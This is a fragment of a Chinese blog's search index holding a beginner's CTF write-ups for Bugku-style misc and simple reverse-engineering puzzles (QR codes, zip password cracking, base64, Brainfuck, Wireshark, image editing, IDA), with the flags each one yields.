        <content type="html"><![CDATA[<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h4 id="1-二维码"><a href="#1-二维码" class="headerlink" title="1 二维码"></a>1 二维码</h4><p>题目下载出的压缩包中是一张二维码<br>这张二维码，用手机扫一扫后输出secret in here .试了一下这东西不是flag，使用Formost分解图片找到了一个压缩包，里面的txt文件名字叫做4.number。<br><img src="https://upload-images.jianshu.io/upload_images/24919094-cc97408e49939ec3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>使用软件进行爆破，得到密码7639，得到flag：CTF{vjpw_wnoei}</p><h4 id="2-基础破解"><a href="#2-基础破解" class="headerlink" title="2  基础破解"></a>2  基础破解</h4><p>给你一个压缩包，你并不能获得什么，因为他是四位数字加密的，嗯题干说的很清晰，密码是四位数字加密的，同样暴力跑下，得到结果2563，输入打开密码文件，得道，</p><pre class="line-numbers language-none"><code class="language-none">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>很明显这是base64编码,使用工具解码得flag{70354300a5100ba78068805661b93a5c}，换成相应格式就可以提交了。</p><h3 id="3-大白-●—●"><a href="#3-大白-●—●" class="headerlink" title="3 大白(●—●)"></a>3 大白(●—●)</h3><p>大白这道题真是一道老题，使用winhex修改图片高度就可以得到flag，但是在之前我的winhex被我玩坏了，重下外带激活，忙活了老一阵。</p><p>####4 多种方法解决<br>从平台下载下来到文件是exe类型，但是无法正常打开，修改拓展名为txt，发现文件头是：</p><blockquote><p>data:image/jpg;base64,</p></blockquote><p>这个是将jpg文件转化成的base64编码，使用工具<a href="http://tool.chinaz.com/tools/imgtobase">base64图片在线转换工具</a>将base64编码专为图片，扫描图片得到flag，KEY{dca57f966e4e4e31fd5b15417da63269}</p><h4 id="5-爱因斯坦"><a href="#5-爱因斯坦" class="headerlink" title="5 爱因斯坦"></a>5 爱因斯坦</h4><p>题目下载下来是一张爱因斯坦的表情包，在图片的属性中有备注this_is_not_password，那么我觉得应该是在图片中有压缩包，使用formost进行分解，得到压缩包，但是txt文件解压需要密码，密码来源我觉得是在图片的高度上，毕竟1366,768可能被隐藏了一部分，然后由于我渣渣的winhex使用，图片高度每有调整，我还不知道如何解决。<br>设想使用暴力破解，但是试了6位没有，实验七位时间已经超过数个小时，这样绝对行不通。<br>在这个题中我唯一知道的信息是this_is_not_password，实验下，结果就是这个。<br>打开txt文档flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h4 id="6-神秘龙卷风"><a href="#6-神秘龙卷风" class="headerlink" title="6 神秘龙卷风"></a>6 神秘龙卷风</h4><p>题干描述科学家用四位数字为它命名，和之前一样，爆破得到密码5463，打开压缩文件，打开txt文件神秘的龙卷风，好家伙这不就是Brainfuck编码吗？<img src="https://upload-images.jianshu.io/upload_images/24919094-6678e719593812b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>将文本内容复制，用在线工具将他转化为txt得到flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h4 id="7-刷新过的图片"><a href="#7-刷新过的图片" class="headerlink" title="7 刷新过的图片"></a>7 刷新过的图片</h4><p>没做出来</p><h4 id="8-wireshark"><a href="#8-wireshark" class="headerlink" title="8 wireshark"></a>8 wireshark</h4><p>使用wirshark追踪http流得到，在追踪多个http流后发现有</p><pre class="line-numbers language-none"><code class="language-none">email&#x3D;flag&amp;password&#x3D;ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha&#x3D;BYUGHTTP&#x2F;1.1 200 OKDate: Mon, 29 Jun 2015 15:09:10 GMTContent-Type: text&#x2F;html; charset&#x3D;UTF-8Transfer-Encoding: chunkedConnection: keep-aliveExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check&#x3D;0, pre-check&#x3D;0Pragma: no-cacheServer: yunjiasu-nginxCF-RAY: 1fe28d0a63e91c3b-JXGContent-Encoding: gzip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha=BYUG得到flag</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h4 id="1-easy-re"><a href="#1-easy-re" class="headerlink" title="1 easy.re"></a>1 easy.re</h4><p>由于做逆向少，ctftools里的工具又不知道为什么打不开easy.exe，从网上下载了IDA就那个图标很磕碜的软件，easy.red的flag就在main（）里<br><img src="https://upload-images.jianshu.io/upload_images/24919094-8aab620e79a564b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>“flag{this_Is_a_EaSyRe}”</p><h4 id="2-reverse-1"><a href="#2-reverse-1" class="headerlink" title="2 reverse_1"></a>2 reverse_1</h4><p>说实话这道题我是用最笨的方法做的，将文件用IDA反编译，从头到尾一个个的找下去，在sub_1400118C0这个项目里面找到了“hello world”这个可能是flag的东西，<br><img src="https://upload-images.jianshu.io/upload_images/24919094-c2f7d359bfd385ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>this is the right flag!更加坚定了我的想法，尝试输入，不对。之后憨憨的从这里到下面全部翻了一遍，试了几个字符串发现没有结果后，最后又回到这里。<br>考虑到之前做bugku的题目有的题目有我们解出的是o，在需要输入的flag上却是0的情况，试着输入0代替o，然后correct。<br>QFNU{hell0_w0rld}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欢迎来到十二惊惶的博客</title>
      <link href="/2021/07/28/hello-world/"/>
      <url>/2021/07/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>网络安全小白，这个博客仅仅做些简单的记录，记录我的学习过程</p><p>欢迎指教</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU靶场解题记录之misc(二)</title>
      <link href="/2021/03/20/BugkuCTF%E4%B9%8BMisc%20(%E4%BA%8C)/"/>
      <url>/2021/03/20/BugkuCTF%E4%B9%8BMisc%20(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<p>时隔许久，重新翻了下bugku这个靶场，又更新了不少东西，找了个时间做了下一些题目</p><h3 id="1-Snowfall"><a href="#1-Snowfall" class="headerlink" title="1 Snowfall"></a>1 Snowfall</h3><p>这个题我是真服这个脑洞……</p><p>OK now you can run whitespace code. By the way, the key is H0wt0Pr1ntAWh17e5p4ceC0de.</p><h3 id="2-easy-nbt"><a href="#2-easy-nbt" class="headerlink" title="2 easy_nbt"></a>2 easy_nbt</h3><blockquote><p>我的世界二进制命名标签（Name Binary Tag），<strong>NBT</strong>格式为Minecraft中用于向文件中存储数据的一种存储格式。NBT格式以树形结构并配以许多标签的形式存储数据。所有的标签都有一个独立的ID和名称。最初的版本如Minecraft Beta1.3中所示为19132个标签，但是随着<a href="https://baike.baidu.com/item/%E9%93%81%E7%A0%A7/9549208">铁砧</a>的引入，增加了一个整形指针变量，标签数量增加至19133个。在NBT格式最初在Minecraft Indev的版本中只有0到10这11个标签可用。 </p></blockquote><p>en……这种我在大佬的博客里找到了nbtexplorer这个游戏修改器性质的东西。再附件里点点点找到了flag{Do_u_kN0w_nbt?}</p><h3 id="3-再也没有纯白的灵魂"><a href="#3-再也没有纯白的灵魂" class="headerlink" title="3 再也没有纯白的灵魂"></a>3 再也没有纯白的灵魂</h3><pre class="line-numbers language-none"><code class="language-none">~呜嗷嗷嗷嗷呜啊嗷啊呜呜嗷呜呜~嗷嗷~啊嗷啊呜嗷嗷~嗷~嗷~呜呜嗷呜啊嗷嗷嗷呜啊呜~啊呜嗷呜呜~嗷呜呜啊嗷啊呜嗷嗷呜嗷~嗷~呜嗷嗷~嗷嗷嗷嗷呜啊呜~呜呜嗷呜呜~嗷~~啊嗷啊呜嗷嗷嗷嗷~嗷~呜呜嗷~呜嗷嗷嗷呜呜嗷嗷嗷呜嗷呜呜~呜啊啊啊嗷啊呜嗷嗷嗷~~嗷~呜呜嗷啊嗷嗷嗷嗷呜呜嗷嗷嗷呜嗷呜呜~呜啊啊啊嗷啊呜嗷嗷嗷~~嗷~呜呜嗷~啊嗷嗷嗷呜啊呜啊嗷呜嗷呜呜啊嗷呜嗷啊嗷啊呜嗷呜~呜~嗷~呜呜嗷呜嗷嗷嗷嗷呜啊嗷嗷呜呜嗷呜呜~呜呜嗷啊<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>兽音密码…. B-嗷 U-呜 G-啊 K-~ 问题是他少了一个啊…..这也导致了我直接没的做……</p><h3 id="4-闪的好快"><a href="#4-闪的好快" class="headerlink" title="4 闪的好快"></a>4 闪的好快</h3><p>gif图片….这个我们可以直接分图然后扫码，得到flag,重点是获得到的flag中的-其实是_ SYC{F1aSh_so_f4sT} </p><p>5 come_game</p><p>我菜，肯定不能通过玩得到flag……<del>后面在测试的时候，有个第四关直接不能走</del>逼着你改关卡，用winhex打开直接去改关卡号1-4都是有东西的，当关卡为5的时候就能得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
